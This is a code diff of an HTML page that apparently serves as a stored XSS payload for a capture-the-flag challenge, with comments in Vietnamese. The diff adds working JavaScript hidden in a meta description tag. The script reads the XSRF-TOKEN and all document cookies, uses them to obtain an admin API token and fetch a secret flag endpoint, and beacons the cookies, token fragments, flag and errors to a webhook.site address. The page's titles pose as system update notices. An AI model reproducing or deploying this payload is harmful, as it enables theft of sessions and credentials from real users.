@@ -2,80 +2,143 @@
 <html>
 <head>
     <meta charset="utf-8">
-    <title>XSS Payload - Get Admin API Token Then Flag v3</title> <!-- Đổi title để dễ phân biệt -->
-    <!-- VERSION_GET_API_TOKEN_V3 --> <!-- Thêm comment để check cache -->
+    <title>XSS Payload - XSRF Fix Attempt</title>
+    <!-- VERSION_XSRF_FIX_V1 -->
 
-    <meta property="og:title" content="Admin Action Required: Token Refresh Process">
+    <meta property="og:title" content="System Update: XSRF Token Handling">
     
     <meta name="description" content="
         <script>
             (function() {
-                var webhook_url = 'https://webhook.site/792a817c-a6b3-4529-a9ed-5780c728488a';
-            
-                // Bước 1: Lấy API Token
+                var webhook_id = '792a817c-a6b3-4529-a9ed-5780c728488a';
+                var webhook_base_url = 'https://webhook.site/';
+                var attacker_url = webhook_base_url + webhook_id;
+
+                function sendToWebhook(data_obj) {
+                    var params = new URLSearchParams();
+                    params.append('source_tag', 'name:description_XSRF_FIX_V1'); 
+                    for (var key in data_obj) {
+                        if (data_obj.hasOwnProperty(key)) {
+                            let value = data_obj[key];
+                            if (typeof value === 'object' && value !== null) {
+                                if (value instanceof Error) {
+                                    value = { 
+                                        error_name: value.name, 
+                                        error_message: value.message, 
+                                        error_stack: value.stack ? value.stack.substring(0, 500) : 'no_stack',
+                                        error_string: value.toString() 
+                                    };
+                                }
+                                try { params.append(key, JSON.stringify(value)); } 
+                                catch (e_stringify) { params.append(key, '[Unserializable Object]'); }
+                            } else {
+                                params.append(key, value);
+                            }
+                        }
+                    }
+                    new Image().src = attacker_url + '?' + params.toString();
+                }
+
+                var xsrfTokenValue = null;
+                try {
+                    var cookies = document.cookie.split(';');
+                    for (var i = 0; i < cookies.length; i++) {
+                        var cookie = cookies[i].trim();
+                        if (cookie.startsWith('XSRF-TOKEN=')) {
+                            xsrfTokenValue = decodeURIComponent(cookie.substring('XSRF-TOKEN='.length));
+                            break;
+                        }
+                    }
+                } catch (e_cookie) {
+                    sendToWebhook({ stage: 'cookie_parse_error', error_details: e_cookie });
+                }
+
+                if (!xsrfTokenValue) {
+                    sendToWebhook({ stage: 'xsrf_token_extraction_failed_or_missing' });
+                    return; // Không có XSRF token thì không nên thử POST
+                }
+
+                sendToWebhook({ 
+                    stage: 'xsrf_fix_script_start', 
+                    extracted_xsrf_token: xsrfTokenValue,
+                    current_document_cookie: document.cookie || 'empty',
+                    location_href: window.location.href 
+                });
+                
+                // Bước 1: Lấy API Token với X-XSRF-TOKEN header
                 fetch('/generate-token', {
                     method: 'POST',
                     headers: {
                         'Accept': 'application/json',
-                        'X-Requested-With': 'XMLHttpRequest'
-                        // XSRF token sẽ được trình duyệt/fetch tự động xử lý nếu có cookie XSRF-TOKEN
+                        'X-Requested-With': 'XMLHttpRequest',
+                        'X-XSRF-TOKEN': xsrfTokenValue // QUAN TRỌNG: Thêm header này tường minh
                     }
                 })
                 .then(response => {
-                    if (!response.ok) { // Nếu lỗi khi lấy token
-                        return response.text().then(text => { // Lấy text lỗi
-                            throw new Error('Failed to generate token: ' + response.status + ' ' + text);
+                    // Log response status trước khi cố gắng đọc body
+                    sendToWebhook({ 
+                        stage: 'generate_token_response_check', 
+                        status: response.status, 
+                        ok: response.ok 
+                    });
+                    if (!response.ok) {
+                        return response.text().then(text => {
+                            throw new Error('Failed to generate token: ' + response.status + ' Body: ' + (text ? text.substring(0,300) : 'NoBody'));
                         });
                     }
-                    return response.json(); // Parse JSON nếu OK
+                    return response.json();
                 })
                 .then(data => {
                     if (data && data.token) {
+                        sendToWebhook({ stage: 'got_api_token', token_prefix: data.token.substring(0,10) + "..." });
                         var admin_api_token = data.token;
-                        // Gửi token về webhook (tùy chọn, để biết là đã lấy được)
-                        new Image().src = webhook_url + '?step=got_api_token&token_prefix=' + admin_api_token.substring(0,10);
-            
+
                         // Bước 2: Dùng API Token để lấy FLAG_2
                         return fetch('/api/admin/sup3rs3cr3t', {
                             method: 'GET',
                             headers: {
                                 'Accept': 'application/json',
-                                'Authorization': 'Bearer ' + admin_api_token, // Quan trọng!
+                                'Authorization': 'Bearer ' + admin_api_token,
                                 'X-Requested-With': 'XMLHttpRequest'
                             }
                         });
                     } else {
-                        throw new Error('No token found in /generate-token response: ' + JSON.stringify(data));
+                        throw new Error('No token field in /generate-token response: ' + JSON.stringify(data).substring(0,300));
                     }
                 })
                 .then(response => { // Response từ /api/admin/sup3rs3cr3t
-                    if (!response.ok) { // Nếu lỗi khi lấy flag
-                         return response.text().then(text => {
-                            throw new Error('Failed to get sup3rs3cr3t: ' + response.status + ' ' + text);
+                     sendToWebhook({ 
+                        stage: 'sup3rs3cr3t_response_check', 
+                        status: response.status, 
+                        ok: response.ok 
+                    });
+                    if (!response.ok) {
+                        return response.text().then(text => {
+                            throw new Error('Failed to get sup3rs3cr3t: ' + response.status + ' Body: ' + (text ? text.substring(0,300) : 'NoBody'));
                         });
                     }
-                    return response.json(); // Parse JSON nếu OK
+                    return response.json();
                 })
                 .then(flagData => {
-                    // Bước 3: Gửi FLAG_2 về webhook
-                    new Image().src = webhook_url + '?step=got_flag&flag_content=' + encodeURIComponent(JSON.stringify(flagData));
+                    sendToWebhook({ stage: 'GOT_FLAG2', flag_content: flagData });
                 })
                 .catch(error => {
-                    // Bước 3 (lỗi): Gửi thông tin lỗi về webhook
-                    var error_message = error.message || error.toString();
-                    var error_stack = error.stack ? error.stack.substring(0,300) : 'no_stack';
-                    new Image().src = webhook_url + '?step=error&message=' + encodeURIComponent(error_message) + '&stack_preview=' + encodeURIComponent(error_stack);
+                    sendToWebhook({ 
+                        stage: 'overall_error_xsrf_fix', 
+                        error_msg: error.message, 
+                        error_stack_preview: error.stack ? error.stack.substring(0,300) : 'no_stack'
+                    });
                 });
             })();
         </script>
     ">
     
-    <meta property="og:description" content="<!-- This meta tag's content is now inside name=description -->">
+    <meta property="og:description" content="<!-- Payload chính đã ở name=description -->">
     <meta name="twitter:card" content="summary">
-    <meta name="twitter:title" content="System Maintenance">
-    <meta name="twitter:description" content="<!-- This meta tag's content is now inside name=description -->">
+    <meta name="twitter:title" content="System Update">
+    <meta name="twitter:description" content="<!-- Payload chính đã ở name=description -->">
 
 </head><body>
-    <h1>XSS Payload Page - Attempting to get Admin API Token then Flag (v3)</h1>
-    <p>The 'name=description' meta tag contains the XSS payload with logic to call /generate-token first.</p>
+    <h1>XSS Payload Page - XSRF Fix Attempt</h1>
+    <p>This page's 'name=description' meta tag contains the XSS payload with explicit X-XSRF-TOKEN header.</p>
 </body></html>
